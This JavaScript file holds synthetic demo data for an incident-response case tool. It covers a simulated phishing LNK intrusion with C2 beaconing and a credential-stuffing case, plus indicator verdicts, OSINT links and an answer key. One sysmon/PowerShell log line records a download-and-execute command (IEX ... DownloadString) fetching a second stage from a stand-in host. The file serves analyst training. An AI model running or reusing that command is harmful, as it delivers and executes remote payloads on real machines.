/* ==========================================================================
   Synthetic demo data. Every address is from a documentation range
   (RFC 5737), every domain is reserved (.example / .test, RFC 2606), every
   person, handle, wallet and hash is invented. Nothing here is real.
   ========================================================================== */
const DEMO = (() => {
const C1 = 'c-lantern', C2 = 'c-portal', C3 = 'c-empty';
const cases = [
  {id:C1, name:'Op Lantern — invoice LNK intrusion', code:'TN-2026-014', status:'active', owner:'You',
   created:'2026-09-14T09:30:00Z', updated:'2026-09-15T11:20:00Z', t0:'r-lnk',
   scope:'Phishing LNK on WS-FIN-07, beaconing implant, lateral movement to DC01. OSINT on the sender infrastructure.'},
  {id:C2, name:'Customer portal — credential stuffing', code:'TN-2026-011', status:'review', owner:'You',
   created:'2026-09-09T13:00:00Z', updated:'2026-09-12T16:05:00Z',
   scope:'Burst of failed logins against portal.corp.example; check overlap with other cases.'},
  {id:C3, name:'Untitled case', code:'TN-2026-015', status:'active', owner:'You',
   created:'2026-09-26T08:00:00Z', updated:'2026-09-26T08:00:00Z', scope:''}
];
/* [id, case, type, time, host, source, title, body, tags] */
const R = [
 ['r-mail',C1,'evidence','2026-09-14T08:52:10Z','MX01','mail-gateway','Invoice email delivered to finance',
  'From: billing@lantern-invoice.example  To: j.okafor@corp.example  Subject: Invoice 4471 overdue  Attachment: Invoice_4471.pdf.lnk (1.9 KB)',['initial-access']],
 ['r-lnk',C1,'evidence','2026-09-14T08:57:33Z','WS-FIN-07','sysmon','LNK opened — cmd spawns encoded PowerShell',
  'EventID 1 ParentImage=C:\\Windows\\explorer.exe Image=C:\\Windows\\System32\\cmd.exe CommandLine="cmd.exe /c powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" from Invoice_4471.pdf.lnk',['execution']],
 ['r-ps',C1,'evidence','2026-09-14T08:57:35Z','WS-FIN-07','powershell','Script block downloads second stage',
  'EventID 4104 ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString(\'http://update-lamp.test/s.ps1\')',['execution']],
 ['r-dns',C1,'evidence','2026-09-14T08:57:41Z','WS-FIN-07','sysmon','DNS: update-lamp.test resolves',
  'EventID 22 QueryName=update-lamp.test QueryResults=198.51.100.23 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',['c2']],
 ['r-drop',C1,'evidence','2026-09-14T08:58:02Z','WS-FIN-07','sysmon','svchost.exe dropped in Public folder',
  'EventID 11 TargetFilename=C:\\Users\\Public\\svchost.exe SHA256=9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a',['payload']],
 ['r-exec',C1,'evidence','2026-09-14T08:58:09Z','WS-FIN-07','sysmon','Fake svchost.exe executes',
  'EventID 1 Image=C:\\Users\\Public\\svchost.exe ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe User=CORP\\j.okafor',['execution']],
 ['r-c2a',C1,'evidence','2026-09-14T08:58:15Z','WS-FIN-07','sysmon','Outbound connection to 203.0.113.47:4444',
  'EventID 3 Image=C:\\Users\\Public\\svchost.exe DestinationIp=203.0.113.47 DestinationPort=4444 -> 203.0.113.47:4444',['c2']],
 ['r-c2b',C1,'evidence','2026-09-14T08:59:16Z','FW-EDGE','firewall','Beacon to 203.0.113.47:4444','allow tcp 10.20.4.17:51022 -> 203.0.113.47:4444 bytes=412',['c2']],
 ['r-c2c',C1,'evidence','2026-09-14T09:00:14Z','FW-EDGE','firewall','Beacon to 203.0.113.47:4444','allow tcp 10.20.4.17:51031 -> 203.0.113.47:4444 bytes=398',['c2']],
 ['r-c2d',C1,'evidence','2026-09-14T09:01:17Z','FW-EDGE','firewall','Beacon to 203.0.113.47:4444','allow tcp 10.20.4.17:51040 -> 203.0.113.47:4444 bytes=405',['c2']],
 ['r-c2e',C1,'evidence','2026-09-14T09:02:15Z','FW-EDGE','firewall','Beacon to 203.0.113.47:4444','allow tcp 10.20.4.17:51052 -> 203.0.113.47:4444 bytes=6120',['c2']],
 ['r-task',C1,'evidence','2026-09-14T09:05:40Z','WS-FIN-07','security','Scheduled task "OneDriveUpdate" created',
  'EventID 4698 TaskName=\\OneDriveUpdate Command=C:\\Users\\Public\\svchost.exe SubjectUserName=CORP\\j.okafor schtasks.exe',['persistence']],
 ['r-run',C1,'evidence','2026-09-14T09:12:03Z','WS-FIN-07','sysmon','Run key points at the dropped binary',
  'EventID 13 TargetObject=HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveUpd Details=C:\\Users\\Public\\svchost.exe',['persistence']],
 ['r-lat',C1,'evidence','2026-09-14T14:31:22Z','DC01','security','Network logon to DC01 as svc_backup',
  'EventID 4624 LogonType=3 TargetUserName=CORP\\svc_backup IpAddress=10.20.4.17 WorkstationName=WS-FIN-07',['lateral-movement']],
 ['r-priv',C1,'evidence','2026-09-14T14:33:10Z','DC01','security','Special privileges assigned to svc_backup',
  'EventID 4672 SubjectUserName=CORP\\svc_backup Privileges=SeBackupPrivilege SeDebugPrivilege',['privilege']],
 ['r-clear',C1,'evidence','2026-09-14T14:40:55Z','DC01','security','Security log cleared on DC01',
  'EventID 1102 The audit log was cleared. SubjectUserName=CORP\\svc_backup',['anti-forensics']],
 ['r-find1',C1,'finding','2026-09-14T15:10:00Z','','analyst','Implant beacons to 203.0.113.47 roughly every 60 s',
  'Five connections from the dropped svchost.exe to 203.0.113.47:4444, 58–63 s apart. Last one carried 6 KB — likely tasking or exfil. Block at FW-EDGE requested.',['c2']],
 ['r-whois',C1,'evidence','2026-09-15T10:20:00Z','','osint:whois','Sender domain registered 13 days before the email',
  'lantern-invoice.example registered 2026-09-01 via Example Registrar Inc.; registrant email n1ghtlamp@mail.example (privacy proxy not used).',['osint','infrastructure']],
 ['r-forum',C1,'evidence','2026-09-15T10:34:00Z','','osint:forum','Handle @n1ghtlamp sells "lamp loader" on forum.example',
  'Profile of @n1ghtlamp on forum.example (joined 2025-11) advertises a "lamp loader" builder; contact listed as n1ghtlamp@mail.example. Screenshot captured.',['osint','actor']],
 ['r-wallet',C1,'evidence','2026-09-15T10:52:00Z','','osint:forum','Forum post lists a BTC payment address',
  'Pricing post by @n1ghtlamp: payment to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh only.',['osint','finance']],
 ['r-chain',C1,'note','2026-09-15T11:05:00Z','','osint:explorer','Wallet received 0.42 BTC on Sep 10 (synthetic)',
  'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh — 3 inbound transfers 2026-09-08..10, total 0.42 BTC. Not yet attributed.',['osint','finance']],
 ['q1',C1,'lead',null,'','checklist','What was the initial access vector?','',['question']],
 ['q2',C1,'lead',null,'','checklist','Which account moved laterally to DC01?','',['question']],
 ['q3',C1,'lead',null,'','checklist','Does 198.51.100.23 host other domains?','Passive DNS needed — offline lookup file or analyst note.',['question']],
 ['q4',C1,'lead',null,'','checklist','Who operates @n1ghtlamp?','',['question']],
 ['q5',C1,'lead',null,'','checklist','Was anything exfiltrated in the 6 KB beacon?','',['question']],
 ['r-scope',C1,'note',null,'','analyst','Scope so far: WS-FIN-07 and DC01','Finance team notified 2026-09-14 10:05. WS-FIN-07 isolated 10:40. DC01 pending image.',['scope']],
 // case 2 — credential stuffing, shares 203.0.113.47 with case 1
 ['p1',C2,'evidence','2026-09-10T02:11:04Z','WEB02','access.log','Burst of failed logins from 203.0.113.47',
  '203.0.113.47 - - [10/Sep/2026:02:11:04 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31"',['auth']],
 ['p2',C2,'evidence','2026-09-10T02:11:05Z','WEB02','access.log','Failed login from 203.0.113.47',
  '203.0.113.47 - - [10/Sep/2026:02:11:05 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31"',['auth']],
 ['p3',C2,'evidence','2026-09-10T02:14:40Z','WEB02','access.log','Successful login after 212 failures',
  '203.0.113.47 - - [10/Sep/2026:02:14:40 +0000] "POST /login HTTP/1.1" 302 0 "-" "python-requests/2.31" user=m.silva@corp.example',['auth']],
 ['p4',C2,'evidence','2026-09-10T03:02:12Z','WEB02','access.log','Second source 192.0.2.66 tries the same list',
  '192.0.2.66 - - [10/Sep/2026:03:02:12 +0000] "POST /login HTTP/1.1" 401 512 "-" "python-requests/2.31"',['auth']],
 ['p5',C2,'finding','2026-09-12T16:00:00Z','','analyst','One account compromised; password reset done',
  'm.silva@corp.example reset 2026-09-12. 203.0.113.47 blocked at WAF.',['auth']],
];
const answers = {q1:'Phishing LNK attachment — Invoice_4471.pdf.lnk', q2:'CORP\\svc_backup'};
const verdicts = {
  'ipv4:203.0.113.47':'malicious','hostport:203.0.113.47:4444':'malicious','domain:update-lamp.test':'malicious',
  'domain:lantern-invoice.example':'malicious','url:http://update-lamp.test/s.ps1':'malicious',
  'sha256:9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a':'malicious',
  'path:C:\\Users\\Public\\svchost.exe':'suspicious','handle:@n1ghtlamp':'suspicious','email:n1ghtlamp@mail.example':'suspicious',
  'ipv4:198.51.100.23':'suspicious','account:CORP\\svc_backup':'suspicious',
  'ipv4:10.20.4.17':'benign','email:j.okafor@corp.example':'benign','domain:corp.example':'benign','file:explorer.exe':'benign'
};
/* Dossier-style attributes: each carries its source record and a confidence 1–3 */
const attrs = {
  'domain:lantern-invoice.example':[['Registered','2026-09-01','r-whois',3],['Registrar','Example Registrar Inc.','r-whois',3],['Registrant email','n1ghtlamp@mail.example','r-whois',2]],
  'handle:@n1ghtlamp':[['Platform','forum.example','r-forum',3],['Joined','2025-11','r-forum',2],['Offers','"lamp loader" builder','r-forum',2],['Contact','n1ghtlamp@mail.example','r-forum',3]],
  'btc:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh':[['Inbound','0.42 BTC across 3 transfers','r-chain',2],['Advertised by','@n1ghtlamp','r-wallet',2]],
  'ipv4:203.0.113.47':[['Port','4444/tcp','r-c2a',3],['Role','C2 for fake svchost.exe','r-find1',3],['Also seen','Credential stuffing, portal case','p1',3]],
  'domain:update-lamp.test':[['Resolves to','198.51.100.23','r-dns',3],['Serves','/s.ps1 second stage','r-ps',3]]
};
/* Asserted relationships: an analyst claim with a label, confidence and its evidence */
const edges = [
  ['email:n1ghtlamp@mail.example','domain:lantern-invoice.example','registered',2,'r-whois'],
  ['handle:@n1ghtlamp','email:n1ghtlamp@mail.example','uses email',3,'r-forum'],
  ['handle:@n1ghtlamp','btc:bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh','advertises wallet',2,'r-wallet'],
  ['domain:update-lamp.test','ipv4:198.51.100.23','resolves to',3,'r-dns'],
  ['sha256:9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a','ipv4:203.0.113.47','beacons to',3,'r-find1']
];
/* Sample feed items — stand-ins for an imported RSS/OPML file */
const feed = [
  {id:'f1',source:'Sample Intel Weekly',date:'2026-09-15T07:00:00Z',title:'"Lamp loader" builder sold on underground forum, C2 on port 4444',
   body:'Researchers track a commodity loader delivered by invoice-themed LNK files. Observed C2: 203.0.113.47:4444 and update-lamp[.]test.'},
  {id:'f2',source:'Sample CERT Bulletin',date:'2026-09-13T12:00:00Z',title:'Credential-stuffing wave against customer portals',
   body:'Automated login attempts with python-requests user agents from 192.0.2.66 and others.'},
  {id:'f3',source:'Sample Vendor Blog',date:'2026-09-11T09:30:00Z',title:'Patch Tuesday: CVE-2026-21001 in print spooler under active exploitation',
   body:'No indicators published yet.'}
];
return {cases, R, answers, verdicts, attrs, edges, feed};
})();
